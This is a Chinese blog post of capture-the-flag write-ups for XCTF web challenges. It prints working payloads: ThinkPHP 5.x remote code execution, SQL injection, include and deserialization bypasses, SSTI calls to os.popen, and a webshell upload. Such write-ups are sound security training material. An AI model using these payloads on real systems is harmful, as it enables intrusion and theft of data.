---
title: 攻防世界 web(一)
categories: ctf题目
---
## baby-web
- 考点：index.php

![](https://img-blog.csdnimg.cn/20210307162642583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

<!--more-->
url 为1.php 修改为 index.php


---
## Training-WWW-Robots
- 考点：robots.txt协议

访问robots.txt,跳转 flag.php

---
## php-rce
- 考点：thinkphp 漏洞rce

![](https://img-blog.csdnimg.cn/20210307162924901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
网上找thinkphp v5x漏洞

payload:
```
 ?s=index/\think\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

---
## web php_include
- 考点：文件包含

```bash
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

法一：

data 伪协议查询即可

法二：

mysql select into outfile

御剑扫一下

![](https://img-blog.csdnimg.cn/2021030716334367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210307163354699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

写入一句话：

![](https://img-blog.csdnimg.cn/20210307163408845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

蚁剑链接：

![](https://img-blog.csdnimg.cn/20210307163415722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## supersql
- 考点：sql  堆叠注入与handler

![](https://img-blog.csdnimg.cn/20210307163623821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

发现提交的1’也可以达到与1同样的效果，使用sql注入 堆叠注入

![](https://img-blog.csdnimg.cn/20210307163654340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

查库：

![](https://img-blog.csdnimg.cn/20210307163712361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

查表：

![](https://img-blog.csdnimg.cn/20210307163729912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
想法获取表（1919810…）中的列：
```
 （1';use supersqli;show columns from `1919810931114514`;）

  MySQL表名为纯数字时(表名和保留字冲突时也是加反引号)，要加反引号：show columns from `1919810931114514`

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307164116335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

至此supersqli目录下的191…表下的flag列呈现在眼前，想法查看flag的内容即可


我们已经知道列flag是表191的第一个文件使用handler：
```
  (1’;handler `1919…` open;handler `1919…` read first;)
```


![](https://img-blog.csdnimg.cn/2021030716421237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## ics-06
- 考点：bp爆破

![](https://img-blog.csdnimg.cn/20210307164340119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
bp 爆破到 2333 时出现 flag

---
## Warmup
- 考点：代码审计

查看源码发现 source.php 

```bash
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

还有个hint.php访问得到

![](https://img-blog.csdnimg.cn/2021030716475547.png#pic_center)

![](https://img-blog.csdnimg.cn/20210307164859528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
定义一个白名单，判断：变量没有定义或者变量不是字符串，false

![](https://img-blog.csdnimg.cn/20210307164944346.png#pic_center)
第二个if语句判断 $page 是否存在于 whitelist数组中，存在则返回true

![](https://img-blog.csdnimg.cn/2021030716505288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
第三个if语句判断截取后的 $page 是否存在于  whitelist数组中，截取 $page中 '?' 前部分，存在则返回true


第四个if语句判断url解码并截取后的 $page 是否存在于 whitelist 中，存在则返回true
```
Payload：
 http://220.249.52.134:43797/source.php?file=source.php? 
```

include:

![](https://img-blog.csdnimg.cn/2021030716530172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
../../../../../../ffffllllaaaagggg 

---
## Newscenter
- sql 注入

order by 查字段数 为 3

payload：
```
 1' union select 1,2,table_name from information_schema.tables

 1'union select 1,2,column_name from information_schema.columns where table_name='secret_table' 

 1'union select 1,2,fl4g from secret_table #   查看flag
 ```

---
## nannannannan-batman
- 考点：正则绕过

整理得到代码：

![](https://img-blog.csdnimg.cn/20210307170023596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
需要满足条件：
```	
 e.length==16
 e.match(/^be0f23/)!=null
 e.match(/233ac/)!=null
 e.match(/e98aa$/)!=null
 e.match(/c7be9/)!=null
   ```

通过匹配 e的值来达到满足if条件；

![](https://img-blog.csdnimg.cn/20210307170501869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

代码中有^和$则e=be0f233ac7be98aa,输入到框中即可

---
## web2
- 考点：代码审计+逆向解密

![](https://img-blog.csdnimg.cn/20210307170658298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
自定义一个加密函数
Strrev反转字符串
Substr选中每个字符

加密过程：反转 ASC+1 base64 反转 rot13

解密：
```bash
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"; 
function decode($str){
	$_o=base64_decode(strrev(str_rot13($str)));
	for($_0=0;$_0<strlen($_o);$_0++){
		$_c=substr($_o,$_0,1);
		$__=ord($_c)-1;
		$_c=chr($__);
		$_=$_.$_c;
	}
	return strrev($_);
}
	
echo decode($miwen);
?>
```
---
## PHP2
- 考点：index.phps + urldecode

发现源码可以直接查看，一般是不能直接查看的

![](https://img-blog.csdnimg.cn/20210307171101149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

如果admin=GET[id]则exit
要想拿到key要先经过

`$_GET[id] = urldecode($_GET[id]);`处理
如果$_GET[id] == "admin"输出key。

>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode ，（如果输入%61解码为a，在下一个解码处无法解码，所以应该上传a的两次编码即%2561）然后在这段代码中运行时，会自动进行一次urldecode

Payload：id=%2561dmin

---
## unserialize3
- 考点：php反序列化绕过__wakeup()

![](https://img-blog.csdnimg.cn/20210307171348277.png#pic_center)

---

**unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。** 

本体关键在于绕开_wakeup()函数

**当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)**

构造：

```bash
<?php
 
class xctf{
 
public $flag = "111";
 
}
 
$s = new xctf();
echo(serialize($s));
 
?>

```

得到：O:4:"xctf":1:{s:4:"flag";s:3:"111";}

payload：

```
 O:4:"xctf":2:{s:4:"flag";s:3:"111";}
 O:1:"xctf":1:{s:4:"flag";s:3:"111";} 
 O:4:"xctf":1:{s:1:"flag";s:3:"111";}
```

---
## upload1
- 考点：文件上传

![](https://img-blog.csdnimg.cn/2021030717190276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
限制上传 jpg，png类型，记事本写入一句话木马，后缀为jpg，上传时用bp抓包，修改后缀为php，蚁剑连接

---
## nizhuansiwei
- 考点：伪协议+反序列化

```bash
<?php   
$text = $_GET["text"]; 
$file = $_GET["file"]; 
$password = $_GET["password"]; 
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){ 
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>"; 
    if(preg_match("/flag/",$file)){ 
        echo "Not now!"; 
        exit();  
    }else{ 
        include($file);  //useless.php 
        $password = unserialize($password); 
        echo $password; 
    } 
} 
else{ 
    highlight_file(__FILE__); 
} 
?>

```

Text用php://input绕过
File 用php://filter绕过
Password反序列化

Useless.php:
```bash
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

![](https://img-blog.csdnimg.cn/20210307172721393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
注：public $file="flag.php";

---
## Web_python_template_injection
- 考点：SSTI

BP抓到 Server：Werkzeug/0.15.5 Python/2.7.16

![](https://img-blog.csdnimg.cn/20210307172854129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
告诉我们是python的ssti

测试：

![](https://img-blog.csdnimg.cn/2021030717291645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查看基类，调用os 无过滤直接
paload：
```
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat fl4g').read()}}
```


![](https://img-blog.csdnimg.cn/20210307172944638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## Web_php_unserialize
- 考点：反序列化

```bash
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>

```
这里有个坑：直接复制与结果不一样，可能是 □ 的问题

![](https://img-blog.csdnimg.cn/2021030717410599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

payload：

```bash
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);  //绕过preg_match
    $C = str_replace(':1:', ':2:',$C);     //绕过wakeup
    var_dump($C);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($C));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
?>

```

---
## easytornado
- 考点：tornado SSTI

![](https://img-blog.csdnimg.cn/20210307174352718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
 flag in /fllllllllllllag
 render
 md5(cookie_secret+md5(filename))
```

![](https://img-blog.csdnimg.cn/2021030717451510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

观察上图得我们需要构造的 url 为：

file?filename=/flllllllag&filehash=xxxxxxxx

而 filehash= md5(cookie_secret+md5(/fllllllllag))

所以需要找到cookie_secret

网上搜 Tornado render payload：

![](https://img-blog.csdnimg.cn/20210307174720185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

>?msg={{handler.settings}}

拿到cookie_secret:  a8c9da8f-0f16-456e-bd0c-41949deab23e

![](https://img-blog.csdnimg.cn/20210307174822872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
计算hash脚本：

```bash
import hashlib

filename = '/fllllllllllllag'
cookie_secret ="a8c9da8f-0f16-456e-bd0c-41949deab23e"

def getvalue(string):
    md5 = hashlib.md5()
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()

def merge():
    print(getvalue(cookie_secret + getvalue(filename)))

merge()
```
访问即可


---
## shrine
- 考点：SSTI


![](https://img-blog.csdnimg.cn/20210307175024203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

一看ssti 测试：

![](https://img-blog.csdnimg.cn/2021030717504197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
get_flashed_messages //字面意思，获取内容，就是取值，后面跟的就是要取得值

current_app //设计模式中代理设计的代理对象，指向flask核心对象和reques的请求类
```

payload：
```
 /shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```
